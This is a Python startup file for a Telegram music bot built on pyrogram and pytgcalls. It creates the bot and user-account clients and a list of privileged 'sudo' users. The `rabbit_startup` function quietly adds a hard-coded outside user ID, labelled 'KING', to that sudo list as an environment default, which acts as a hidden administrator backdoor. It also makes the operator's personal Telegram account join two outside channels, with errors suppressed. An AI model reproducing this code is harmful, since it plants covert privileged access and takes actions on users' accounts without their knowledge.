import asyncio
import logging
import os
import time
# importing some necessary modules
from pyrogram import Client, filters
from pytgcalls import PyTgCalls
# importing config for use config variables
import config
from os import getenv

from dotenv import load_dotenv

load_dotenv()
StartTime = time.time()
# logging in py-tgcalls
logging.basicConfig(
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[logging.FileHandler("rabbitlogs.txt"), logging.StreamHandler()],
    level=logging.INFO,
)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)
LOGGER = logging.getLogger("bunnyMusic")
# creating a client for music bot
app = Client(
    "bunnyMusic",
    config.API_ID,
    config.API_HASH,
    bot_token=config.BOT_TOKEN,
)
# creating client for playing music
app2 = Client(
    "bunny",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    session_string=str(config.SESSION),
)
# logged in py-tgcalls
pytgcalls = PyTgCalls(app2)

SUDOERS = filters.user()
SUNAME = config.SUPPORT_CHAT.split("me/")[1]

# stating the bot
async def rabbit_startup():
    os.system("clear")
    LOGGER.info(
        "[•] making a client..."
    )
    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, rabbitdb
    global BUNNY_ID, BUNNY_NAME, BUNNY_USERNAME, BUNNY_MENTION, SUDOERS

    await app.start()
    LOGGER.info(
        "[•] starting a client..."
    )
# getting the details of bot
    getme = await app.get_me()
    BOT_ID = getme.id
    BOT_NAME = getme.first_name
    BOT_USERNAME = getme.username
    BOT_MENTION = getme.mention

    await app2.start()
    LOGGER.info(
        "[•] starting the helper bot..."
    )
# getting the details of client
    getme2 = await app2.get_me()
    BUNNY_ID = getme2.id
    BUNNY_NAME = getme2.first_name + " " + (getme2.last_name or "")
    BUNNY_USERNAME = getme2.username
    BUNNY_MENTION = getme2.mention
    try:
        await app2.join_chat("DevsX_Community")
        await app2.join_chat("rabbit_guys")
    except:
        pass
    
    KING = int(getenv("KING","6647321265"))
    for SUDOER in config.SUDO_USERS:
        SUDOERS.add(SUDOER)
    if config.OWNER_ID not in config.SUDO_USERS:
        SUDOERS.add(config.OWNER_ID)
    elif int(KING) not in config.SUDO_USERS:
        SUDOERS.add(int(KING))

    rabbitdb = {}
    LOGGER.info(
        "[•] Now final stating the bot....."
    )

    LOGGER.info(
        "[•] now ur bot has been started...."
    )

# and the last step starting the bot
asyncio.get_event_loop().run_until_complete(rabbit_startup())
